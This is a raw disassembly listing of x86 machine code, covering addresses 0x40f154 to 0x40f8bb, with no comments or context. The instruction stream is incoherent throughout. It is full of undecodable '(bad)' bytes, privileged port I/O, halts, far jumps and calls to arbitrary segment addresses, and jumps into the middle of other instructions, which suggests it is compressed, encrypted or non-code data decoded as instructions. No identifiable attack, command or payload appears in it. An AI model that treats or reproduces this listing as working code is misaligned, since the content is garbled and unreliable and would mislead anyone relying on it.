  40f154:	xor    eax,0x66bb2dd0
  40f159:	test   al,0xbe
  40f15c:	and    al,0x80
  40f15e:	mov    ds:0x660473a4,eax
  40f163:	or     DWORD PTR [edi-0x809df05],edx
  40f169:	sti    
  40f16a:	cmp    ebp,DWORD PTR [ecx-0x80]
  40f16d:	or     eax,0x2693cb31
  40f172:	xor    DWORD PTR [edi-0x2f],esi
  40f175:	adc    BYTE PTR [eax+0x66],ah
  40f178:	and    dh,dl
  40f17a:	(bad)  
  40f17b:	jl     0x40f1e5
  40f17d:	adc    al,0x98
  40f17f:	xchg   ecx,eax
  40f180:	in     al,dx
  40f181:	add    BYTE PTR [eax-0x22],bh
  40f184:	add    al,0x45
  40f186:	sub    al,0x8a
  40f188:	xchg   ebp,eax
  40f189:	push   ebx
  40f18a:	jae    0x40f209
  40f18c:	mov    edi,0x93c96cd9
  40f191:	mov    WORD PTR [eax+0x19],?
  40f194:	outs   dx,BYTE PTR ds:[esi]
  40f195:	cmp    eax,DWORD PTR [ebx-0x44]
  40f198:	sub    edi,esi
  40f19a:	jmp    0xaba76444
  40f19f:	mov    eax,ds:0x58a5828d
  40f1a4:	shl    BYTE PTR [eax+eiz*1],1
  40f1a7:	push   es
  40f1a8:	mov    cl,BYTE PTR [ebx]
  40f1aa:	(bad)  
  40f1ab:	in     al,dx
  40f1ac:	mov    esp,0xbe776502
  40f1b1:	(bad)  
  40f1b2:	mov    esi,0x6cc0cb5a
  40f1b7:	and    esi,edi
  40f1b9:	inc    ecx
  40f1ba:	pop    edi
  40f1bb:	inc    esi
  40f1bc:	cmp    ax,WORD PTR [ecx]
  40f1bf:	outs   dx,DWORD PTR ds:[esi]
  40f1c0:	sbb    ch,dl
  40f1c2:	lahf   
  40f1c3:	jno    0x40f162
  40f1c5:	jno    0x40f220
  40f1c7:	sahf   
  40f1c8:	out    0x94,al
  40f1ca:	sbb    DWORD PTR [edi+0x50],esp
  40f1cd:	iret   
  40f1ce:	and    BYTE PTR [ecx-0x41fb4db7],ch
  40f1d4:	xchg   ebx,eax
  40f1d5:	outs   dx,BYTE PTR ds:[esi]
  40f1d6:	bound  ecx,QWORD PTR [ebp-0x10]
  40f1d9:	stos   DWORD PTR es:[edi],eax
  40f1da:	hlt    
  40f1db:	xor    eax,0x6484598f
  40f1e0:	add    ebp,DWORD PTR [ebx]
  40f1e2:	pushf  
  40f1e3:	stos   DWORD PTR es:[edi],eax
  40f1e4:	jge    0x40f22c
  40f1e6:	fwait
  40f1e7:	cld    
  40f1e8:	pop    esi
  40f1e9:	or     ah,BYTE PTR [edx]
  40f1eb:	and    esp,DWORD PTR [eax]
  40f1ed:	push   cs
  40f1ee:	or     DWORD PTR [edx+0x65],esi
  40f1f1:	(bad)  
  40f1f2:	jle    0x40f1da
  40f1f4:	idiv   BYTE PTR [eax+0x35]
  40f1f7:	sub    esi,edi
  40f1f9:	jl     0x40f226
  40f1fb:	hlt    
  40f1fc:	sub    al,0x65
  40f1fe:	sbb    DWORD PTR [edx-0x4b],0x4fb59311
  40f205:	sub    BYTE PTR [edx+0x7f],dh
  40f208:	out    0xb4,al
  40f20a:	add    al,0x11
  40f20c:	jo     0x40f1b8
  40f20e:	cmp    eax,0x78754a36
  40f213:	retf   
  40f214:	pop    esp
  40f215:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f216:	pusha  
  40f217:	push   ecx
  40f218:	call   0xc626:0x208c9efd
  40f21f:	jl     0x40f228
  40f221:	lea    esp,[esi+0x36]
  40f224:	pop    es
  40f225:	(bad)  
  40f226:	icebp  
  40f227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f228:	mov    esi,es
  40f22a:	mov    gs,ecx
  40f22c:	mov    DWORD PTR [edi],esi
  40f22e:	or     al,0xc4
  40f230:	mov    eax,ds:0xce03a4ca
  40f235:	sbb    BYTE PTR [eax],0x98
  40f238:	pop    esi
  40f239:	pusha  
  40f23a:	scas   al,BYTE PTR es:[edi]
  40f23b:	xor    cl,BYTE PTR ds:0x85afa935
  40f241:	push   ecx
  40f242:	or     esi,DWORD PTR [edx+0x4a14efd6]
  40f248:	aaa    
  40f249:	cli    
  40f24a:	pop    edi
  40f24b:	and    BYTE PTR [edi-0x36032d7],dh
  40f251:	sbb    al,0x69
  40f253:	pop    ss
  40f254:	adc    esp,DWORD PTR [esi]
  40f256:	jns    0x40f1d9
  40f258:	xor    al,0x74
  40f25a:	add    al,0x3c
  40f25c:	mov    esi,es
  40f25e:	sub    esp,esp
  40f260:	cmp    dh,al
  40f262:	pop    edx
  40f263:	loope  0x40f1ec
  40f265:	xchg   esp,eax
  40f266:	mov    ebp,0xc2dd2a4d
  40f26b:	outs   dx,DWORD PTR ds:[esi]
  40f26c:	rcl    DWORD PTR [ecx+0x32],0xa5
  40f270:	xchg   esi,eax
  40f271:	js     0x40f2bb
  40f273:	jg     0x40f26b
  40f275:	and    al,BYTE PTR ss:[edi+0x6281cc63]
  40f27c:	jmp    0x40f28f
  40f27e:	push   es
  40f27f:	push   edi
  40f280:	cli    
  40f281:	or     eax,0x3cbdcedc
  40f286:	mov    dl,0x52
  40f288:	ss pop ss
  40f28a:	imul   esi,DWORD PTR [edi-0x75ff3ada],0x83d13766
  40f294:	mov    bl,0x9
  40f296:	into   
  40f297:	(bad)  
  40f298:	xchg   ebp,eax
  40f299:	std    
  40f29a:	mov    al,ds:0xbe3cda2e
  40f29f:	frstor [ecx]
  40f2a1:	syscall 
  40f2a3:	push   ebp
  40f2a4:	fabs   
  40f2a6:	leave  
  40f2a7:	mov    esi,0x9ce03a79
  40f2ac:	mov    esi,0xa779b3ec
  40f2b1:	push   edi
  40f2b2:	mov    eax,ds:0x59f8c162
  40f2b7:	sub    ecx,esp
  40f2b9:	shl    BYTE PTR [ebx+0x1d],cl
  40f2bc:	and    edi,ebx
  40f2be:	mov    eax,0xa49c0845
  40f2c3:	retf   0x6f0
  40f2c6:	add    cl,0x92
  40f2c9:	adc    eax,0x6a0bc654
  40f2ce:	daa    
  40f2cf:	pop    eax
  40f2d0:	lahf   
  40f2d1:	dec    esp
  40f2d2:	push   ebp
  40f2d3:	add    DWORD PTR [esi],edi
  40f2d5:	(bad)  
  40f2d6:	mov    edx,0x47d177b5
  40f2db:	push   cs
  40f2dc:	sub    bh,cl
  40f2de:	ret    0xdc5b
  40f2e1:	inc    esp
  40f2e2:	xor    esp,esp
  40f2e4:	mov    al,ds:0xb830f4d6
  40f2e9:	cld    
  40f2ea:	mov    ds:0xa1a4cec8,eax
  40f2ef:	push   esp
  40f2f0:	in     al,0x33
  40f2f2:	mov    ebx,0x7f01ffb6
  40f2f7:	into   
  40f2f8:	(bad)  
  40f2f9:	test   eax,0xb1b066c3
  40f2fe:	jmp    0xaee96219
  40f303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f304:	enter  0x41df,0x49
  40f308:	pop    ecx
  40f309:	and    al,0x7c
  40f30b:	push   0x18
  40f30d:	enter  0x164e,0x41
  40f311:	inc    esi
  40f312:	xor    BYTE PTR [ebx+esi*8-0x6c7aa8dd],cl
  40f319:	je     0x40f320
  40f31b:	adc    DWORD PTR [eax],0x3265295c
  40f321:	scas   al,BYTE PTR es:[edi]
  40f322:	ins    DWORD PTR es:[edi],dx
  40f323:	add    DWORD PTR [ecx+edi*2+0x439256d3],0x8a91a6a9
  40f32e:	add    eax,0x86441ef1
  40f333:	sub    DWORD PTR [eax-0x2],eax
  40f336:	add    esp,DWORD PTR [ecx]
  40f338:	int    0xac
  40f33a:	repz scas al,BYTE PTR es:[edi]
  40f33c:	fisttp QWORD PTR [esi+0x45]
  40f33f:	pop    edx
  40f340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f341:	pushf  
  40f342:	push   DWORD PTR [eax]
  40f344:	pop    ebp
  40f345:	mov    bl,0x4b
  40f347:	les    edx,FWORD PTR cs:[ebx]
  40f34a:	ins    BYTE PTR es:[edi],dx
  40f34b:	fst    DWORD PTR [edi-0x74221d84]
  40f351:	push   esp
  40f352:	mov    esi,0x8740cd76
  40f357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f358:	(bad)  
  40f35a:	mov    ecx,0x84ddfa72
  40f35f:	jg     0x40f324
  40f361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f362:	sbb    eax,0xa50f0a8a
  40f367:	int    0xb8
  40f369:	in     al,dx
  40f36a:	or     ch,dh
  40f36c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f36d:	jmp    0xf0cb7f97
  40f372:	out    dx,eax
  40f373:	fcmovne st,st(1)
  40f375:	push   esi
  40f376:	mov    ds,WORD PTR [eax]
  40f378:	call   0x3bb6:0xebaf035b
  40f37f:	pop    edx
  40f380:	jl     0x40f396
  40f382:	add    eax,0xebb37c3f
  40f387:	inc    esp
  40f388:	sbb    al,BYTE PTR [edi]
  40f38a:	and    bh,BYTE PTR [ebx-0x2]
  40f38d:	ret    
  40f38e:	jecxz  0x40f34a
  40f390:	shl    BYTE PTR [ebx-0x49326077],cl
  40f396:	in     al,dx
  40f397:	or     eax,0x15383851
  40f39c:	mov    edi,0x33b0528f
  40f3a1:	xchg   esp,eax
  40f3a2:	cs dec edx
  40f3a4:	xor    dh,BYTE PTR [ebp+0x37]
  40f3a7:	fcom   DWORD PTR [ecx-0x5f]
  40f3aa:	shr    DWORD PTR [ebx+edi*1],cl
  40f3ad:	jmp    0x84dc:0xd4ef7a19
  40f3b4:	xor    BYTE PTR [edi+0x43],bh
  40f3b7:	jnp    0x40f3cd
  40f3b9:	mov    ?,esi
  40f3bb:	test   BYTE PTR [edi+0x6c9f41a1],dh
  40f3c1:	fidiv  DWORD PTR [ecx-0x79]
  40f3c4:	aad    0x2d
  40f3c6:	ficomp DWORD PTR [eax+eax*1]
  40f3c9:	fnsave [ebp-0x74]
  40f3cc:	mov    ds:0xde42adb0,al
  40f3d1:	mov    ds:0x84c8f305,eax
  40f3d6:	loope  0x40f3c7
  40f3d8:	inc    edx
  40f3d9:	and    DWORD PTR [ebp-0x32],ebp
  40f3dc:	xor    ebp,DWORD PTR [esp+edi*1]
  40f3df:	popa   
  40f3e0:	in     eax,0x61
  40f3e2:	mov    edi,0x5b9200f
  40f3e7:	push   ebx
  40f3e8:	test   BYTE PTR ss:[eax],ch
  40f3eb:	popa   
  40f3ec:	add    edi,esi
  40f3ee:	outs   dx,DWORD PTR ds:[esi]
  40f3ef:	shl    edi,0xdf
  40f3f2:	mov    DWORD PTR [ecx+0x39],esi
  40f3f5:	cwde   
  40f3f6:	lds    ecx,FWORD PTR [ebx+0x46]
  40f3f9:	mov    ah,0x6f
  40f3fb:	inc    esp
  40f3fc:	adc    bh,BYTE PTR [edx+0x7f]
  40f3ff:	(bad)  
  40f400:	(bad)  
  40f401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f402:	js     0x40f45e
  40f404:	cwde   
  40f405:	mov    ebx,DWORD PTR [ecx-0x66]
  40f408:	sbb    DWORD PTR [ebx-0x4c],esp
  40f40b:	(bad)
  40f40f:	call   0x71d7:0x13636d42
  40f416:	mov    cl,0xe1
  40f418:	jecxz  0x40f3e7
  40f41a:	cmp    al,0xf3
  40f41c:	sub    BYTE PTR [edi-0x7db6b6c9],dh
  40f422:	or     DWORD PTR [ecx-0x245d7782],edx
  40f428:	test   eax,ecx
  40f42a:	inc    esp
  40f42b:	jne    0x40f4a5
  40f42d:	cs imul edi,ebx,0x1c
  40f431:	mov    cl,0xfe
  40f433:	lods   al,BYTE PTR ds:[esi]
  40f434:	xchg   ecx,eax
  40f435:	lods   eax,DWORD PTR ds:[esi]
  40f436:	or     BYTE PTR ds:0xc1df91a,bl
  40f43c:	cmp    al,bl
  40f43e:	mov    esi,0x77f59663
  40f443:	push   ebp
  40f444:	retf   0xb90f
  40f447:	test   al,0xdc
  40f449:	jle    0x40f43c
  40f44b:	sub    BYTE PTR ds:0x101a9691,ah
  40f451:	cmp    cl,bl
  40f453:	es adc bh,al
  40f456:	fcom   DWORD PTR [ebx+0x5c854e00]
  40f45c:	int3   
  40f45d:	popf   
  40f45e:	mov    bh,0xcb
  40f460:	(bad)  
  40f461:	jae    0x40f455
  40f463:	pop    edx
  40f464:	rcl    eax,cl
  40f466:	xchg   DWORD PTR [edx+0x549d8fe6],ebx
  40f46c:	sub    al,0xde
  40f46e:	setb   BYTE PTR [ebx-0x6]
  40f472:	(bad)  
  40f473:	fistp  QWORD PTR [ebp-0x50bfe73e]
  40f479:	es inc eax
  40f47b:	push   eax
  40f47c:	repz xor DWORD PTR [eax+0x5b9ccb6f],edx
  40f483:	xchg   esp,eax
  40f484:	aad    0x6f
  40f486:	mov    edi,ebx
  40f488:	retf   0xaee2
  40f48b:	xchg   esi,eax
  40f48c:	jae    0x40f4c1
  40f48e:	or     DWORD PTR [eax-0x9],edi
  40f491:	jmp    0x40f4a8
  40f493:	or     al,0xba
  40f495:	xchg   ebp,eax
  40f496:	dec    ebp
  40f497:	pop    eax
  40f498:	jge    0x40f474
  40f49a:	shr    edx,1
  40f49c:	gs out 0x7,eax
  40f49f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4a0:	push   ecx
  40f4a1:	hlt    
  40f4a2:	ss test eax,0x666f0fb7
  40f4a8:	lock add BYTE PTR [esi+0x1ac4713c],dh
  40f4af:	mov    dh,0x2a
  40f4b1:	cdq    
  40f4b2:	xchg   ebp,eax
  40f4b3:	out    0xf4,al
  40f4b5:	test   ah,dl
  40f4b7:	cdq    
  40f4b8:	lock jecxz 0x40f445
  40f4bb:	fs jns 0x40f509
  40f4be:	jmp    0xaf17975f
  40f4c3:	inc    esp
  40f4c4:	xor    edx,DWORD PTR [esi]
  40f4c6:	fwait
  40f4c7:	dec    ebp
  40f4c8:	js     0x40f4ef
  40f4ca:	cld    
  40f4cb:	(bad)  
  40f4cc:	xchg   edi,eax
  40f4cd:	nop
  40f4ce:	mov    dh,0x5c
  40f4d0:	push   ebx
  40f4d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4d2:	hlt    
  40f4d3:	scas   al,BYTE PTR es:[edi]
  40f4d4:	outs   dx,DWORD PTR ds:[esi]
  40f4d5:	sub    eax,ecx
  40f4d7:	jl     0x40f49c
  40f4d9:	mov    edi,0x682035bd
  40f4de:	mov    ebp,0x42e231d1
  40f4e3:	add    al,0x59
  40f4e5:	rcr    ebx,0xd8
  40f4e8:	xchg   ebx,eax
  40f4e9:	ja     0x40f4ac
  40f4eb:	adc    edx,ebx
  40f4ed:	cmp    al,0x82
  40f4ef:	sbb    dl,BYTE PTR [edi+0x23]
  40f4f2:	pushf  
  40f4f3:	clc    
  40f4f4:	or     BYTE PTR [eax+0x22],al
  40f4f7:	imul   eax,DWORD PTR [ecx+0x22],0x74644131
  40f4fe:	sub    DWORD PTR [ecx],0xffffff85
  40f501:	rol    ch,cl
  40f503:	sar    DWORD PTR [ebp-0xf548b0],0x8c
  40f50a:	popa   
  40f50b:	out    dx,al
  40f50c:	in     al,dx
  40f50d:	icebp  
  40f50e:	pop    ebx
  40f50f:	les    edi,FWORD PTR [ecx]
  40f511:	fisttp DWORD PTR [ebp-0x1b]
  40f514:	sbb    al,BYTE PTR [ecx]
  40f516:	std    
  40f517:	sub    BYTE PTR [ebx+esi*1+0x44],0x4f
  40f51c:	fbstp  TBYTE PTR [edi-0x43c84df9]
  40f522:	mov    edx,0x22fe0d24
  40f527:	sti    
  40f528:	imul   edi,DWORD PTR [edx+eax*4-0x3a15500d],0xffffffa4
  40f530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f531:	mov    al,0x2e
  40f533:	cdq    
  40f534:	sub    cl,bl
  40f536:	sbb    bl,BYTE PTR [eax]
  40f538:	cmp    al,0xd9
  40f53a:	std    
  40f53b:	lds    ecx,FWORD PTR [ecx-0x1b5aac1f]
  40f541:	xor    DWORD PTR [eax],eax
  40f543:	shl    BYTE PTR [eax],0x58
  40f546:	in     al,0x64
  40f548:	lods   al,BYTE PTR ds:[esi]
  40f549:	mov    ebx,0x44aa06ec
  40f54e:	or     BYTE PTR ds:0x92080c6a,ch
  40f554:	inc    edi
  40f555:	sbb    al,0x89
  40f557:	pushf  
  40f558:	add    edx,DWORD PTR [ebp+ebx*8-0x1b]
  40f55c:	lahf   
  40f55d:	jmp    0xb998:0xe1fbd01c
  40f564:	sbb    DWORD PTR [ecx-0x163b23af],edi
  40f56a:	mov    DWORD PTR [edi+0x12fa4afe],eax
  40f570:	cmc    
  40f571:	ins    DWORD PTR es:[edi],dx
  40f572:	or     BYTE PTR [edi+0x3429e61d],dl
  40f578:	sahf   
  40f579:	push   ebx
  40f57a:	int3   
  40f57b:	aad    0xf4
  40f57d:	jb     0x40f56d
  40f57f:	mov    ebx,0xa985c7af
  40f584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f585:	mov    esp,0x69bc49a6
  40f58a:	popf   
  40f58b:	mov    ds:0x90ec1f23,al
  40f590:	push   0xffffffa0
  40f592:	call   0xc2a5:0x4a7764ab
  40f599:	mov    dh,0xe8
  40f59b:	jp     0x40f580
  40f59d:	adc    ah,al
  40f59f:	in     al,0x64
  40f5a1:	sub    ecx,edi
  40f5a3:	dec    edx
  40f5a4:	inc    BYTE PTR [eax+0x742e0628]
  40f5aa:	enter  0xdf9b,0xc1
  40f5ae:	or     eax,0x3b7a89b9
  40f5b3:	fwait
  40f5b4:	loopne 0x40f55c
  40f5b6:	mov    ebp,0x34146ba0
  40f5bb:	pop    ecx
  40f5bc:	mov    bh,dl
  40f5be:	jbe    0x40f5ec
  40f5c0:	out    0xc2,al
  40f5c2:	loopne 0x40f5bd
  40f5c4:	cmc    
  40f5c5:	add    eax,0x1f7f9196
  40f5ca:	mov    dl,0xef
  40f5cc:	test   DWORD PTR [edi-0x36],edi
  40f5cf:	sbb    DWORD PTR [ebx-0x8],0xfffffff3
  40f5d3:	in     al,0xb7
  40f5d5:	mov    bl,0x18
  40f5d7:	jb     0x40f64e
  40f5d9:	bound  edi,QWORD PTR [edi-0x2c]
  40f5dc:	fwait
  40f5dd:	mov    dh,0x63
  40f5df:	frstor [ebx-0x4d57686d]
  40f5e5:	ins    BYTE PTR es:[edi],dx
  40f5e6:	xor    al,BYTE PTR [esi]
  40f5e8:	mov    ebx,0xdf2e0354
  40f5ed:	jb     0x40f588
  40f5ef:	jno    0x40f5b8
  40f5f1:	push   ebx
  40f5f2:	mov    WORD PTR [esi],?
  40f5f4:	pop    esp
  40f5f5:	mov    cl,0xea
  40f5f7:	lds    ecx,FWORD PTR [ecx+0x309f2417]
  40f5fd:	jae    0x40f670
  40f5ff:	jmp    0x91432eb8
  40f604:	cwde   
  40f605:	fiadd  WORD PTR [edx]
  40f607:	jo     0x40f61d
  40f609:	mov    ebx,DWORD PTR [ecx]
  40f60b:	ins    BYTE PTR es:[edi],dx
  40f60c:	jo     0x40f627
  40f60e:	test   al,0x3a
  40f610:	into   
  40f611:	mov    esp,0x7e02f884
  40f616:	jp     0x40f5d6
  40f618:	cs or  al,0x1c
  40f61b:	jnp    0x40f5c7
  40f61d:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f61f:	jb     0x40f68c
  40f621:	fs adc al,0x2e
  40f624:	dec    esp
  40f625:	test   DWORD PTR [edx+0x386c9028],esp
  40f62b:	daa    
  40f62c:	xor    BYTE PTR [esi],bh
  40f62e:	in     al,0xdd
  40f630:	pop    esp
  40f631:	xchg   BYTE PTR [ebx+0x64],ah
  40f634:	jge    0x40f652
  40f636:	call   0xdd2c:0x89a81112
  40f63d:	(bad)  
  40f63e:	adc    eax,0xbc651e93
  40f643:	sti    
  40f644:	daa    
  40f645:	in     al,0xa8
  40f647:	cmp    BYTE PTR [edi],ah
  40f649:	in     al,dx
  40f64a:	dec    edx
  40f64b:	fs sbb ch,0x9a
  40f64f:	js     0x40f64e
  40f651:	stc    
  40f652:	out    dx,al
  40f653:	jbe    0x40f666
  40f655:	mov    edx,0x500ac98b
  40f65a:	mov    ch,0x1f
  40f65c:	cmp    DWORD PTR [edi-0x58],esp
  40f65f:	or     edx,ecx
  40f661:	pushf  
  40f662:	push   es
  40f663:	mov    esp,0x6dcadded
  40f668:	std    
  40f669:	stos   DWORD PTR es:[edi],eax
  40f66a:	cmp    cl,dl
  40f66c:	adc    eax,DWORD PTR [ecx-0x46]
  40f66f:	mov    dl,0xf8
  40f671:	call   0x4768:0x544869bd
  40f678:	fs pop esi
  40f67a:	daa    
  40f67b:	pop    di
  40f67d:	add    BYTE PTR [ecx],dh
  40f67f:	cmp    al,0x37
  40f681:	jo     0x40f629
  40f683:	imul   esp,DWORD PTR [eax-0x15],0x3f48bea8
  40f68a:	stos   BYTE PTR es:[edi],al
  40f68b:	pop    esi
  40f68c:	mov    bh,0xb3
  40f68e:	xor    DWORD PTR [ebx],eax
  40f690:	mov    DWORD PTR ds:0x659bbc32,ebp
  40f696:	cmp    eax,0x1f8162d1
  40f69b:	xor    esp,DWORD PTR [ebx-0x541a57c]
  40f6a1:	jno    0x40f628
  40f6a3:	mov    eax,DWORD PTR [ecx]
  40f6a5:	cmp    bh,BYTE PTR [esi+0x3e]
  40f6a8:	pop    ss
  40f6a9:	into   
  40f6aa:	into   
  40f6ab:	sub    bl,BYTE PTR [ebp+0x11]
  40f6ae:	mov    esi,0x661c2fe
  40f6b3:	fst    DWORD PTR [ebp-0x64]
  40f6b6:	loop   0x40f713
  40f6b8:	add    BYTE PTR [edi],dl
  40f6ba:	imul   esp,ecx,0x4d
  40f6bd:	stc    
  40f6be:	dec    eax
  40f6bf:	rcr    BYTE PTR [ecx+0x5],cl
  40f6c2:	cmp    BYTE PTR [eax],bl
  40f6c4:	adc    cl,cl
  40f6c6:	jbe    0x40f65e
  40f6c8:	iret   
  40f6c9:	les    ebx,FWORD PTR [esi+0x5c]
  40f6cc:	push   cs
  40f6cd:	into   
  40f6ce:	push   esp
  40f6cf:	cmp    al,0xbb
  40f6d1:	cmp    eax,0xa7a5b2f8
  40f6d6:	mov    DWORD PTR [ebp+ebp*4-0x38bd5d25],ebx
  40f6dd:	sub    al,0xd8
  40f6df:	ds popf 
  40f6e1:	(bad)  
  40f6e2:	ror    DWORD PTR [ebx-0x603fcea6],cl
  40f6e8:	and    al,0x80
  40f6ea:	mov    ch,0x7c
  40f6ec:	(bad)  
  40f6ed:	(bad)  
  40f6ee:	pop    edi
  40f6ef:	xor    ebx,DWORD PTR [ecx+0x6778c368]
  40f6f5:	and    al,BYTE PTR [ecx-0x2b]
  40f6f8:	lods   al,BYTE PTR ds:[esi]
  40f6f9:	les    edx,FWORD PTR [ecx]
  40f6fb:	inc    edi
  40f6fc:	or     al,0x74
  40f6fe:	or     eax,0xdba872d
  40f703:	pop    edx
  40f704:	add    ebx,DWORD PTR [ecx+0x4b]
  40f707:	sub    cl,BYTE PTR [ecx]
  40f709:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40f70b:	mov    edi,0xcac9f52f
  40f710:	mov    ah,0x20
  40f712:	push   ecx
  40f713:	retf   0x8269
  40f716:	sbb    eax,0x53931b60
  40f71b:	aam    0x68
  40f71d:	add    BYTE PTR [eax],bl
  40f71f:	cwde   
  40f720:	test   eax,0xdbc3b77e
  40f725:	dec    edx
  40f726:	out    0xf6,al
  40f728:	lods   al,BYTE PTR ds:[esi]
  40f729:	aas    
  40f72a:	jmp    0x6c97:0x25dc8986
  40f731:	data16 jecxz 0x40f762
  40f734:	add    eax,0xd72801e9
  40f739:	jns    0x40f707
  40f73b:	dec    ebx
  40f73c:	ins    BYTE PTR es:[edi],dx
  40f73d:	sub    BYTE PTR ds:0xe2e797e5,ah
  40f743:	xchg   edx,eax
  40f744:	pop    ds
  40f745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f746:	or     eax,0x48274b95
  40f74b:	xlat   BYTE PTR ds:[ebx]
  40f74c:	stos   BYTE PTR es:[edi],al
  40f74d:	fild   QWORD PTR fs:[esi+0x7e]
  40f751:	jnp    0x40f770
  40f753:	adc    ecx,DWORD PTR [ebx-0x6590c580]
  40f759:	and    BYTE PTR [eax-0x1dd7410a],al
  40f75f:	lahf   
  40f760:	call   0x59cf90bc
  40f765:	iret   
  40f766:	xor    bl,BYTE PTR [edi+eiz*4+0x643e8780]
  40f76d:	lahf   
  40f76e:	sar    BYTE PTR [esi+0x7975ded6],cl
  40f774:	scas   eax,DWORD PTR es:[edi]
  40f775:	pop    ecx
  40f776:	push   esi
  40f777:	out    0x1,eax
  40f779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f77a:	lds    ebx,FWORD PTR [edx+0x3d]
  40f77d:	mov    ds:0xcbf861f8,al
  40f782:	xor    DWORD PTR [esi+edx*2],edi
  40f785:	mov    gs,WORD PTR ds:0x31195c8f
  40f78b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f78c:	sar    BYTE PTR [edx-0x2d],1
  40f78f:	xor    al,BYTE PTR [eax+0x6222d603]
  40f795:	cmp    DWORD PTR [esi+ebp*1-0x4ef3a8e5],esp
  40f79c:	pop    edi
  40f79d:	ret    0x3e6b
  40f7a0:	fld    QWORD PTR [ebx+0x64]
  40f7a3:	int    0xbe
  40f7a5:	cmp    ecx,DWORD PTR [ecx+edx*4-0x4d]
  40f7a9:	call   0x503c:0x46cc5a5c
  40f7b0:	loope  0x40f7b2
  40f7b2:	cmp    DWORD PTR [esi],0x14ba733c
  40f7b8:	xchg   ebp,eax
  40f7b9:	inc    edi
  40f7ba:	in     eax,dx
  40f7bb:	loope  0x40f7b7
  40f7bd:	(bad)  
  40f7be:	and    ah,al
  40f7c0:	inc    esp
  40f7c1:	and    dh,al
  40f7c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7c4:	lea    edx,[ebp+edx*1-0x6bc6f75]
  40f7cb:	inc    edi
  40f7cc:	dec    edi
  40f7cd:	scas   al,BYTE PTR es:[edi]
  40f7ce:	push   ecx
  40f7cf:	push   cs
  40f7d0:	std    
  40f7d1:	jbe    0x40f7d8
  40f7d3:	pop    ax
  40f7d5:	mov    ebx,0x5b490bb
  40f7da:	xchg   ebx,eax
  40f7db:	or     al,0xe8
  40f7dd:	adc    DWORD PTR [ecx],esi
  40f7df:	repnz sbb ecx,edx
  40f7e2:	lock (bad) 
  40f7e4:	mov    esi,0xb08e6696
  40f7e9:	jns    0x40f851
  40f7eb:	icebp  
  40f7ec:	aaa    
  40f7ed:	sbb    eax,0x28fc0c40
  40f7f2:	out    0x62,eax
  40f7f4:	cmp    esp,DWORD PTR [ebp-0x3]
  40f7f7:	repnz lods eax,DWORD PTR cs:[esi]
  40f7fa:	dec    ebx
  40f7fb:	mov    ebx,0x13ad7d71
  40f800:	mov    al,ds:0x29b29c78
  40f805:	xchg   esp,eax
  40f806:	xchg   ecx,eax
  40f807:	and    al,0xa0
  40f809:	fwait
  40f80a:	sub    ecx,0x88773d00
  40f810:	fdivr  DWORD PTR [eax+0x7c]
  40f813:	gs mov edi,0x39c99f09
  40f819:	dec    eax
  40f81a:	xor    dh,bl
  40f81c:	dec    ebx
  40f81d:	mov    bl,0x22
  40f81f:	or     eax,0xa77885a1
  40f824:	mov    ds:0x3eb1771e,al
  40f829:	rol    BYTE PTR gs:[edx+ebp*2],0xac
  40f82e:	jns    0x40f7f6
  40f830:	xchg   esi,eax
  40f831:	sbb    al,0xd9
  40f833:	in     al,0x93
  40f835:	cwde   
  40f836:	inc    edx
  40f837:	lods   eax,DWORD PTR ds:[esi]
  40f838:	stos   BYTE PTR es:[edi],al
  40f839:	pushf  
  40f83a:	sbb    ebp,DWORD PTR es:[eax-0x32]
  40f83e:	mov    ebx,0xedc3c588
  40f843:	push   0xffffffaa
  40f845:	ret    0xce5b
  40f848:	cmc    
  40f849:	pop    edi
  40f84a:	xor    BYTE PTR [edx+0xd],bh
  40f84d:	enter  0xdbd9,0x95
  40f851:	mov    ecx,0x954155b1
  40f856:	fsubr  DWORD PTR [edi]
  40f858:	fidiv  DWORD PTR [ecx+edi*8+0x4b]
  40f85c:	fbstp  TBYTE PTR [edx-0x54]
  40f85f:	mov    esp,0x9cf1d6fc
  40f864:	lods   al,BYTE PTR ds:[esi]
  40f865:	pop    ss
  40f866:	(bad)  
  40f867:	ds cli 
  40f869:	not    DWORD PTR [edx-0x3a0cef22]
  40f86f:	sbb    BYTE PTR [ecx+0x39],ah
  40f872:	pushf  
  40f873:	mov    ebx,0xe862741b
  40f878:	jecxz  0x40f878
  40f87a:	lea    eax,cs:[edx-0x8]
  40f87e:	mov    bh,0x58
  40f880:	push   eax
  40f881:	test   BYTE PTR [ebx],ah
  40f883:	mov    dl,dl
  40f885:	dec    ecx
  40f886:	inc    esp
  40f887:	adc    ax,0x7581
  40f88b:	mov    bl,0x26
  40f88d:	mov    esi,ebx
  40f88f:	and    BYTE PTR [edx+0x5341f0b9],bl
  40f895:	out    dx,eax
  40f896:	adc    al,0x9
  40f898:	xor    bh,BYTE PTR [ebp+0x30]
  40f89b:	aaa    
  40f89c:	retf   
  40f89d:	xor    edx,DWORD PTR [edi]
  40f89f:	mov    bh,0x8
  40f8a1:	add    eax,0x39221365
  40f8a6:	xchg   DWORD PTR [ecx-0xc7eaeaa],esi
  40f8ac:	lods   al,BYTE PTR ds:[esi]
  40f8ad:	dec    ebx
  40f8ae:	jae    0x40f897
  40f8b0:	mov    ds:0x3e5c2f91,eax
  40f8b5:	fimul  WORD PTR [ecx]
  40f8b7:	out    0x78,al
  40f8b9:	aam    0xdf
  40f8bb:	pop    ss
